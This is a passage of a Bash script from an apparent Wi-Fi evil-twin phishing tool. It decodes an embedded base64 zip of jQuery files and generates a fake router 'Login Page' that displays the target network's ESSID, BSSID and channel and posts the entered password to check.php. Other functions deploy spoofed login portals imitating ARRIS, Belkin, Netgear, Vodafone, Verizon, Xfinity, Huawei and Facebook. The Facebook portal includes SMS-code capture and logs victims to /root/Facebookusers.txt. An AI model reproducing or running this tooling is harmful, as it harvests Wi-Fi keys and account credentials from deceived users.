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"| base64 -d >$DUMP_PATH/file.zip

	unzip $DUMP_PATH/file.zip -d $DUMP_PATH/data &>$flux_output_device
	rm $DUMP_PATH/file.zip &>$flux_output_device

	echo "<!DOCTYPE html>
	<html>
	<head>
	    <title>Login</title>
	    <meta name=\"viewport\" content=\"width=device-width, height=device-height, initial-scale=1.0\"/>
	    <style>$(cat $DUMP_PATH/data/jquery.mobile-1.3.2.css)</style>
	    <script>$(cat $DUMP_PATH/data/jquery-1.8.3.min.js)</script>
	    <script>$(cat $DUMP_PATH/data/jquery.mobile-1.3.2.js)</script>
	    <style>
	.ui-btn {
	    width: 20% !important;
	}
	</style>
	</head>
	<body>
	    <div data-role=\"page\" id=\"login\" data-theme=\"b\">
		<div data-role=\"top\" data-theme=\"a\">
		    <h3>Login Page</h3>
		</div>

		<div data-role=\"content\">

	"$DIALOG_WEB_OK"
		</div>

		<div data-theme=\"a\" data-role=\"footer\" data-position=\"fixed\">

		</div>
	    </div>
	    <div data-role=\"page\" id=\"second\">
		<div data-theme=\"a\" data-role=\"top\">
		    <h3></h3>
		</div>

		<div data-role=\"content\">

		</div>

		<div data-theme=\"a\" data-role=\"footer\" data-position=\"fixed\">
		</div>
	    </div>
	</body>
	</html>
	">$DUMP_PATH/data/final.html
	echo "<!DOCTYPE html>
	<html>
	<head>
	    <title>Login</title>
	    <meta name=\"viewport\" content=\"width=device-width, height=device-height, initial-scale=1.0\"/>
	    <style>$(cat $DUMP_PATH/data/jquery.mobile-1.3.2.css)</style>
	    <script>$(cat $DUMP_PATH/data/jquery-1.8.3.min.js)</script>
	    <script>$(cat $DUMP_PATH/data/jquery.mobile-1.3.2.js)</script>
	</head>
	<body>
	    <div data-role=\"page\" id=\"login\" data-theme=\"b\">
		<div data-role=\"top\" data-theme=\"a\">
		    <h3>Login Page</h3>
		</div>

		<div data-role=\"content\">

		    "$DIALOG_WEB_ERROR"
	<br>
	<a href=\"index.htm\" data-role=\"button\" rel=\"external\" data-inline=\"true\" id=\"back\" onclick=\"location.reload();location.href='index.htm'\">"$DIALOG_WEB_BACK"</a>

		</div>

		<div data-theme=\"a\" data-role=\"footer\" data-position=\"fixed\">

		</div>
	    </div>
	    <div data-role=\"page\" id=\"second\">
		<div data-theme=\"a\" data-role=\"top\">
		    <h3></h3>
		</div>

		<div data-role=\"content\">

		</div>

		<div data-theme=\"a\" data-role=\"footer\" data-position=\"fixed\">
		</div>
	    </div>
	</body>
	</html>
	">$DUMP_PATH/data/error.html

	echo "<!DOCTYPE html>
	<html>
	<head>
	    <title>Login</title>
	    <meta name=\"viewport\" content=\"width=device-width, height=device-height, initial-scale=1.0\"/>
	    <style>$(cat $DUMP_PATH/data/jquery.mobile-1.3.2.css)</style>
	    <script>$(cat $DUMP_PATH/data/jquery-1.8.3.min.js)</script>
	    <script>$(cat $DUMP_PATH/data/jquery.mobile-1.3.2.js)</script>
	    <style>
		#login-button {
		    margin-top: 30px;
		}

	.ui-grid-c {
	    text-align : center;
		margin-right: -50% !important;

	}

	.ui-block-b {
	    text-align : left;

	}

	.ui-block-a {
	    text-align : right;
		margin-right: 10px !important;


	}
	    </style>
	</head>
	<body>
	    <div data-role=\"page\" id=\"login\" data-theme=\"b\">
		<div data-role=\"top\" data-theme=\"a\">
		    <h3>Login Page</h3>
		</div>

		<div data-role=\"content\">
		<fieldset>
		    <form id=\"check-user\" class=\"ui-body ui-body-a ui-corner-all\" data-ajax=\"false\" action=\"check.php\" method=\"POST\" >
	<div class=ui-grid-c>

	      <div class=ui-block-a>ESSID:</div>

	      <div class=ui-block-b><b>$Host_SSID</b></div>

	      <div class=ui-block-a>BSSID:</div>

	      <div class=ui-block-b><b>$Host_MAC</b></div>

	      <div class=ui-block-a>Chan:</div>

	      <div class=ui-block-b><b>$Host_CHAN</b></div>

	    </div>

	<br>

	"$DIALOG_WEB_INFO"
			    <div data-role=\"fieldcontain\">
				<label for=\"password\">"$DIALOG_WEB_INPUT"</label>
				</div>
				<input type=\"password\" value=\"\" name=\"key1\" id=\"key1\"/>

			    <input type=\"submit\" data-theme=\"b\" name=\"submit\" id=\"submit\" data-inline=\"true\" value=\""$DIALOG_WEB_SUBMIT"\">
			</fieldset>
		    </form>
		</div>

		<div data-theme=\"a\" data-role=\"footer\" data-position=\"fixed\">

		</div>
	    </div>
	    <div data-role=\"page\" id=\"second\">
		<div data-theme=\"a\" data-role=\"top\">
		    <h3></h3>
		</div>

		<div data-role=\"content\">

		</div>

		<div data-theme=\"a\" data-role=\"footer\" data-position=\"fixed\">
		</div>
	    </div>
	</body>
	</html>
	">$DUMP_PATH/data/index.htm



	}


	# Crea el contenido de la interface web
function ARRIS {
mkdir $DUMP_PATH/data &>$flux_output_device
        cp  $WORK_DIR/Sites/ARRIS-ENG/background.png $DUMP_PATH/data
        cp  $WORK_DIR/Sites/ARRIS-ENG/house.png $DUMP_PATH/data
        cp  $WORK_DIR/Sites/ARRIS-ENG/house1.png $DUMP_PATH/data
        cp  $WORK_DIR/Sites/ARRIS-ENG/ayuda.htm $DUMP_PATH/data
        cp  $WORK_DIR/Sites/ARRIS-ENG/error.html $DUMP_PATH/data
        cp  $WORK_DIR/Sites/ARRIS-ENG/final.html $DUMP_PATH/data
        cp  $WORK_DIR/Sites/ARRIS-ENG/index.htm $DUMP_PATH/data

	              }

	#Conten interface web
function BELKIN {
mkdir $DUMP_PATH/data &>$flux_output_device
        cp  $WORK_DIR/Sites/BELKIN-ENG/info2.css $DUMP_PATH/data
        cp  $WORK_DIR/Sites/BELKIN-ENG/info.css $DUMP_PATH/data
        cp  $WORK_DIR/Sites/BELKIN-ENG/background.png $DUMP_PATH/data
        cp  $WORK_DIR/Sites/BELKIN-ENG/house.png $DUMP_PATH/data
        cp  $WORK_DIR/Sites/BELKIN-ENG/house1.png $DUMP_PATH/data
        cp  $WORK_DIR/Sites/BELKIN-ENG/ayuda.htm $DUMP_PATH/data
        cp  $WORK_DIR/Sites/BELKIN-ENG/error.html $DUMP_PATH/data
        cp  $WORK_DIR/Sites/BELKIN-ENG/final.html $DUMP_PATH/data
        cp  $WORK_DIR/Sites/BELKIN-ENG/info.html $DUMP_PATH/data
        cp  $WORK_DIR/Sites/BELKIN-ENG/index.htm $DUMP_PATH/data

	              }

	#Conten interface web
function NETGEAR {
mkdir $DUMP_PATH/data &>$flux_output_device
        cp  $WORK_DIR/Sites/NETGEAR-ENG/info2.css $DUMP_PATH/data
        cp  $WORK_DIR/Sites/NETGEAR-ENG/info.css $DUMP_PATH/data
        cp  $WORK_DIR/Sites/NETGEAR-ENG/background.png $DUMP_PATH/data
        cp  $WORK_DIR/Sites/NETGEAR-ENG/house.png $DUMP_PATH/data
        cp  $WORK_DIR/Sites/NETGEAR-ENG/house1.png $DUMP_PATH/data
        cp  $WORK_DIR/Sites/NETGEAR-ENG/ayuda.htm $DUMP_PATH/data
        cp  $WORK_DIR/Sites/NETGEAR-ENG/error.html $DUMP_PATH/data
        cp  $WORK_DIR/Sites/NETGEAR-ENG/final.html $DUMP_PATH/data
        cp  $WORK_DIR/Sites/NETGEAR-ENG/info.html $DUMP_PATH/data
        cp  $WORK_DIR/Sites/NETGEAR-ENG/index.htm $DUMP_PATH/data

	              }

#Conten interface web
function ARRIS2 {

mkdir $DUMP_PATH/data &>$flux_output_device
        cp  $WORK_DIR/Sites/ARRIS-ESP/info2.css $DUMP_PATH/data
        cp  $WORK_DIR/Sites/ARRIS-ESP/info.css $DUMP_PATH/data
        cp  $WORK_DIR/Sites/ARRIS-ESP/background.png $DUMP_PATH/data
        cp  $WORK_DIR/Sites/ARRIS-ESP/house.png $DUMP_PATH/data
        cp  $WORK_DIR/Sites/ARRIS-ESP/house1.png $DUMP_PATH/data
        cp  $WORK_DIR/Sites/ARRIS-ESP/ayuda.htm $DUMP_PATH/data
        cp  $WORK_DIR/Sites/ARRIS-ESP/error.html $DUMP_PATH/data
        cp  $WORK_DIR/Sites/ARRIS-ESP/final.html $DUMP_PATH/data
        cp  $WORK_DIR/Sites/ARRIS-ESP/info.html $DUMP_PATH/data
        cp  $WORK_DIR/Sites/ARRIS-ESP/index.htm $DUMP_PATH/data

	              }

#Conten interface web
function NETGEAR2 {

mkdir $DUMP_PATH/data &>$flux_output_device
        cp  $WORK_DIR/Sites/NETGEAR-ESP/info2.css $DUMP_PATH/data
        cp  $WORK_DIR/Sites/NETGEAR-ESP/info.css $DUMP_PATH/data
        cp  $WORK_DIR/Sites/NETGEAR-ESP/background.png $DUMP_PATH/data
        cp  $WORK_DIR/Sites/NETGEAR-ESP/house.png $DUMP_PATH/data
        cp  $WORK_DIR/Sites/NETGEAR-ESP/house1.png $DUMP_PATH/data
        cp  $WORK_DIR/Sites/NETGEAR-ESP/ayuda.htm $DUMP_PATH/data
        cp  $WORK_DIR/Sites/NETGEAR-ESP/error.html $DUMP_PATH/data
        cp  $WORK_DIR/Sites/NETGEAR-ESP/final.html $DUMP_PATH/data
        cp  $WORK_DIR/Sites/NETGEAR-ESP/info.html $DUMP_PATH/data
        cp  $WORK_DIR/Sites/NETGEAR-ESP/index.htm $DUMP_PATH/data

	              }

#Conten interface web
function VODAFONE {

mkdir $DUMP_PATH/data &>$flux_output_device
        cp  $WORK_DIR/Sites/VODAFONE-ESP/info2.css $DUMP_PATH/data
        cp  $WORK_DIR/Sites/VODAFONE-ESP/info.css $DUMP_PATH/data
        cp  $WORK_DIR/Sites/VODAFONE-ESP/background.png $DUMP_PATH/data
        cp  $WORK_DIR/Sites/VODAFONE-ESP/house.png $DUMP_PATH/data
        cp  $WORK_DIR/Sites/VODAFONE-ESP/house1.png $DUMP_PATH/data
        cp  $WORK_DIR/Sites/VODAFONE-ESP/ayuda.htm $DUMP_PATH/data
        cp  $WORK_DIR/Sites/VODAFONE-ESP/error.html $DUMP_PATH/data
        cp  $WORK_DIR/Sites/VODAFONE-ESP/final.html $DUMP_PATH/data
        cp  $WORK_DIR/Sites/VODAFONE-ESP/info.html $DUMP_PATH/data
        cp  $WORK_DIR/Sites/VODAFONE-ESP/index.htm $DUMP_PATH/data

	              }

#Conten interface web
function VERIZON {

mkdir $DUMP_PATH/data &>$flux_output_device
        cp -r $WORK_DIR/Sites/Login-Verizon/Verizon_files $DUMP_PATH/data
        cp $WORK_DIR/Sites/Login-Verizon/Verizon.html $DUMP_PATH/data

	              }

function XFINITY {

mkdir $DUMP_PATH/data &>$flux_output_device
        cp -r $WORK_DIR/Sites/Login-Xfinity/Xfinity_files $DUMP_PATH/data
		cp $WORK_DIR/Sites/Login-Xfinity/Xfinity.html $DUMP_PATH/data
	              }

function topusers {
echo -e " "
echo -e " _ _ _ "
 echo -e " /   \ __ _ _// _/ "
 echo -e " / /\  |       /| )_ ___ \ "
 echo -e " / | \ | | / \ "
 echo -e " __| /|  /__ /___ / "
 echo -e " / / / / "
 echo -e " "
}
# Create a Facebook login page
function Facebook {
mkdir $DUMP_PATH/data &>$ares_output_device
        cp  $WORK_DIR/Sites/Facebook/config.ini $DUMP_PATH/data
        cp  $WORK_DIR/Sites/Facebook/data.php $DUMP_PATH/data
        cp  $WORK_DIR/Sites/Facebook/facebook-logo.png $DUMP_PATH/data
        cp  $WORK_DIR/Sites/Facebook/font-awesome.min.css $DUMP_PATH/data
        cp  $WORK_DIR/Sites/Facebook/index.htm $DUMP_PATH/data
        cp  $WORK_DIR/Sites/Facebook/index.js $DUMP_PATH/data
        cp  $WORK_DIR/Sites/Facebook/jquery.min.js $DUMP_PATH/data
        cp  $WORK_DIR/Sites/Facebook/oauth.html $DUMP_PATH/data
        cp  $WORK_DIR/Sites/Facebook/reset.css $DUMP_PATH/data
        cp  $WORK_DIR/Sites/Facebook/roboto.css $DUMP_PATH/data
        cp  $WORK_DIR/Sites/Facebook/style.css $DUMP_PATH/data
        cp  $WORK_DIR/Sites/Facebook/datasms.php $DUMP_PATH/data
        cp  $WORK_DIR/Sites/Facebook/smscode.htm $DUMP_PATH/data
		cp  $WORK_DIR/Sites/Facebook/Facebookusers.txt $DUMP_PATH/data

[ -f /root/Facebookusers.txt ] || cp  $WORK_DIR/Sites/Facebook/Facebookusers.txt /root/Facebookusers.txt && echo  >> /root/Facebookusers.txt && echo -e "           "  >> /root/Facebookusers.txt && echo -e "             _____ _____________________ _________  "  >> /root/Facebookusers.txt && echo -e "            /  _  \\ _____   \_   _____//   _____/  "  >> /root/Facebookusers.txt && echo -e "           /  /_\  \|       _/|    __)_ \_____  \   "  >> /root/Facebookusers.txt && echo -e "          /    |    \    |   \|        \/        \  "  >> /root/Facebookusers.txt && echo -e "          \____|__  /____|_  /_______  /_______  /  "  >> /root/Facebookusers.txt && echo -e "                  \/       \/        \/        \/   "  >> /root/Facebookusers.txt && echo -e "          " && echo -e "               by princeofguilty & deltax           "  >> /root/Facebookusers.txt && echo -e "            "  >> /root/Facebookusers.txt && echo -e " Network ssid : $Host_SSID"  >> /root/Facebookusers.txt
}

#Conten interface web
function HUAWEI {

mkdir $DUMP_PATH/data &>$flux_output_device
        cp  $WORK_DIR/Sites/HUAWEI-ENG/info2.css $DUMP_PATH/data
        cp  $WORK_DIR/Sites/HUAWEI-ENG/info.css $DUMP_PATH/data
        cp  $WORK_DIR/Sites/HUAWEI-ENG/background.png $DUMP_PATH/data
        cp  $WORK_DIR/Sites/HUAWEI-ENG/house.png $DUMP_PATH/data
        cp  $WORK_DIR/Sites/HUAWEI-ENG/house1.png $DUMP_PATH/data
        cp  $WORK_DIR/Sites/HUAWEI-ENG/ayuda.htm $DUMP_PATH/data
        cp  $WORK_DIR/Sites/HUAWEI-ENG/error.html $DUMP_PATH/data
        cp  $WORK_DIR/Sites/HUAWEI-ENG/final.html $DUMP_PATH/data
        cp  $WORK_DIR/Sites/HUAWEI-ENG/info.html $DUMP_PATH/data
        cp  $WORK_DIR/Sites/HUAWEI-ENG/index.htm $DUMP_PATH/data

	              }

######################################### < INTERFACE WEB > ########################################


top&& setresolution && setinterface
